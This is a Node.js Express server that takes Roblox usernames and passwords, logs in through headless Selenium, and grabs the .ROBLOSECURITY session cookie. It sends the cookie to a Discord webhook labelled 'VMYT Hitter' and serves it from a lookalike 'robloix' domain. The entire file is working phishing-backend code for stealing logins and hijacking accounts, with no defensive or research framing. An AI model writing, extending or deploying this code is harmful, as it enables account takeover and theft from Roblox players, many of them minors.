const express = require('express');
const { Builder, By, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;
const cookieStore = {};

app.use(bodyParser.json());

// POST /login
app.post('/login', async (req, res) => {
  const { username, password, webhookURL, info } = req.body;

  if (!username || !password || !webhookURL) {
    return res.status(400).json({ success: false, message: 'Missing username, password, or webhookURL.' });
  }

  let driver;
  try {
    driver = await new Builder()
      .forBrowser('chrome')
      .setChromeOptions(
        new chrome.Options()
          .addArguments('--headless=new', '--no-sandbox', '--disable-gpu', '--window-size=1280,800')
      )
      .build();

    await driver.get('https://www.roblox.com/login');

    await driver.wait(until.elementLocated(By.id('login-username')), 15000);
    await driver.findElement(By.id('login-username')).sendKeys(username);
    await driver.findElement(By.id('login-password')).sendKeys(password);
    await driver.findElement(By.id('login-button')).click();

    let loggedIn = false;
    let errorMessage = '';
    const timeout = Date.now() + 25000;

    while (Date.now() < timeout) {
      const url = await driver.getCurrentUrl();
      if (url.includes('roblox.com/home') || url.includes('roblox.com/users')) {
        loggedIn = true;
        break;
      }

      const pageSource = await driver.getPageSource();
      if (pageSource.includes('Please complete the verification') || pageSource.includes('human verification')) {
        errorMessage = 'Roblox requires CAPTCHA/human verification.';
        break;
      }
      if (pageSource.includes('Incorrect username or password') || pageSource.includes('unexpected error')) {
        errorMessage = 'Incorrect login credentials.';
        break;
      }

      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    if (!loggedIn) {
      return res.status(200).json({ success: false, message: errorMessage || 'Login failed or blocked by security.' });
    }

    const cookies = await driver.manage().getCookies();
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');

    if (robloxCookie) {
      const randomId = Math.floor(Math.random() * 899999) + 100000;
      const cookieLink = `https://x.robloix.wuaze.com/cookie/${randomId}`;
      cookieStore[randomId] = { cookie: robloxCookie.value, info };

      // Send Discord webhook
      try {
        await axios.post(webhookURL, {
          username: "VMYT Hitter",
          avatar_url: "https://cdn.discordapp.com/attachments/1391913953034240114/1392772737881210931/DISCORDPFPFORBOT.webp",
          content: `@everyone 🚀 **𝗡𝗘𝗪 𝗥𝗔𝗜𝗡𝗕𝗢𝗪 𝗛𝗜𝗧!**\n\n🔗 **Cookie Link:** ${cookieLink}`,
          embeds: [info]
        });
      } catch (e) {
        console.error("Webhook failed:", e.message);
      }

      return res.json({ success: true, cookieLink });
    } else {
      return res.status(200).json({ success: false, message: 'Cookie not found. Login might have failed.' });
    }

  } catch (err) {
    console.error('Error during login:', err);
    return res.status(500).json({ success: false, message: 'Server error: ' + err.message });
  } finally {
    if (driver) await driver.quit();
  }
});

// GET /cookie/:id
app.get('/cookie/:id', (req, res) => {
  const id = req.params.id;
  const cookieData = cookieStore[id];
  if (cookieData) {
    res.send(`<h2>.ROBLOSECURITY:</h2><textarea rows="4" cols="80">${cookieData.cookie}</textarea>`);
  } else {
    res.status(404).send('Cookie not found.');
  }
});

// GET /
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/generator.html');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
